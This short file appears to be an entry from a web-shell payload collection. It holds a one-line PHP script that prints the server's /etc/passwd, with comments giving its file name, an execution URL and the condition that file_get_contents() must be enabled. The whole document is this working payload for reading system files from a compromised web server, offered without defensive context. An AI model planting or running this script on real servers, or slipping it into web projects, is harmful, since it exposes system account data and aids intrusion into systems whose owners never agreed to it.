# This will only work if the file_get_contents() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_file_get_contents.php

<?php echo file_get_contents("/etc/passwd"); ?>